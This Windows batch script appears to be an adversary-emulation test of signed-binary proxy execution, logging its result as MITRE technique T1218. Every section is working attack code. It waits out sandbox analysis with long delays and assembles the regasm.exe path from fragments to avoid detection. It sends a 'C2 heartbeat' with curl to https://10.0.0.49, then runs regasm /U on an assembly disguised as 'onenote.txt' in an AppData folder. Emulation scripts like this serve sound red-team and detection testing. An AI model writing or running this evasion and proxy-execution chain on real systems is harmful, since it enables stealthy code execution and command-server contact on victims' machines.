@echo off
SETLOCAL EnableDelayedExpansion

REM ============ PHR_ CONSTANTS (PLAIN LITERALS - NEVER OBFUSCATED) ============
SET txisnba=%APPDATA%\8239\9b5375c3
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?8239-7
SET jwcnifl=ITZEL-S2BO
SET rrocubc=7
SET xzanpex=onenote.txt
SET dvhhyc=8239

REM ============ LOG FILE CONFIGURATION ============
SET logdir=%APPDATA%\!rrocubc!
SET logfile=%logdir%\macula-simulations.log
if not exist "%logdir%" mkdir "%logdir%" >nul 2>nul

REM ============ INITIAL SANDBOX EVASION DELAYS ============
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: delay_start=evasion_initial>>> "%logfile%" 2>nul
timeout /t 45 /nobreak >nul
ping -n 20 127.0.0.1 >nul

REM ============ OBFUSCATED LOLBIN AND PATH CONSTRUCTION ============
SET a=reg
SET b=asm
SET c=.exe
SET d=/
SET e=U
SET f=%a%%b%%c%
SET g=%d%%e%
SET h=C:\Windows\Microsoft.NET\Framework\v4.0.30319\
SET i=C:\Windows\Microsoft.NET\Framework64\v4.0.30319\

SET part[0]=reg
SET part[1]=asm
SET part[2]=.exe
SET ref0=part[0]
SET ref1=part[1]
SET ref2=part[2]
SET binbase=
for /l %%x in (0,1,2) do (
  CALL SET binpart=%%!ref%%x!%%
  SET binbase=!binbase!!binpart!
)

SET pathpart1=Framework
SET pathpart2=v4.0.30319
SET pathpart3=\
SET pathbuild1=!h!
SET pathbuild2=!i!
SET archcheck=%PROCESSOR_ARCHITECTURE%

REM ============ C2 HEARTBEAT ============
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: heartbeat_start=connecting>>> "%logfile%" 2>nul
SET cmd1=curl
SET cmd2=-k
SET cmd3=-s
SET cmd4=-o
SET cmd5=nul
SET hburl=!keghkgto!
SET runner=!cmd1!
!runner! !cmd2! !cmd3! !cmd4! !cmd5! "!hburl!" >nul 2>nul
if !errorlevel! equ 0 (
  SET hbresult=1
  SET hberror=
) else (
  SET hbresult=0
  SET hberror=connection_failed
)
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: heartbeat_complete=result_!hbresult!>>> "%logfile%" 2>nul

REM ============ INTEROPERATION DELAY ============
CHOICE /C Y /N /D Y /T 12 >nul

REM ============ CHANGE DIRECTORY ============
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: chdir_start=!txisnba!>>> "%logfile%" 2>nul
SET targetdir=!txisnba!
cd /d "!targetdir!" >nul 2>nul
if !errorlevel! equ 0 (
  SET cdresult=1
  SET cderror=
  echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: chdir_complete=success>>> "%logfile%" 2>nul
) else (
  SET cdresult=0
  SET cderror=access_denied
  echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: chdir_failed=!cderror!>>> "%logfile%" 2>nul
)

REM ============ RANDOM EXECUTION DELAY ============
SET /A delay=%RANDOM% %% 20 + 10
timeout /t !delay! /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: delay_random=!delay!s>>> "%logfile%" 2>nul

REM ============ BUILD FULL REGASM PATH ============
if "!archcheck!"=="AMD64" (
  SET fullpath=!pathbuild2!!binbase!
) else (
  SET fullpath=!pathbuild1!!binbase!
)
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: regasm_path=!fullpath!>>> "%logfile%" 2>nul

REM ============ BUILD COMMAND ARGUMENTS ============
SET dllfile=!xzanpex!
SET args=!g! "!dllfile!"
SET cmdref1=fullpath
SET cmdref2=args
CALL SET execcmd=%%!cmdref1!%% %%!cmdref2!%%

REM ============ EXECUTE REGASM ============
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: execution_start=regasm_unregister>>> "%logfile%" 2>nul
!execcmd! >nul 2>nul
if !errorlevel! equ 0 (
  SET execresult=1
  SET execerror=
  echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: execution_complete=success>>> "%logfile%" 2>nul
) else (
  SET execresult=0
  SET execerror=assembly_load_failed
  echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: execution_failed=!execerror!>>> "%logfile%" 2>nul
)

REM ============ FINAL DELAY ============
ping -n 8 127.0.0.1 >nul

REM ============ TTP LOGGING ============
REM Format timestamp for TTP log
for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value') do set datetime=%%I
set ttpstamp=!datetime:~0,4!-!datetime:~4,2!-!datetime:~6,2! !datetime:~8,2!:!datetime:~10,2!:!datetime:~12,2!.!datetime:~15,3!

REM Log T1218 - Signed Binary Proxy Execution
SET ttp_id=T1218
SET ttp_name=Signed Binary Proxy Execution
SET result=!execresult!
SET error_detail=!execerror!
echo [!ttpstamp!][!jwcnifl!]: !rrocubc!-!dvhhyc!-!ttp_id!|!ttp_name!=!result!:!error_detail!>> "%logfile%" 2>nul

REM ============ CLEANUP ============
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: script_complete=simulation_finished>>> "%logfile%" 2>nul
ENDLOCAL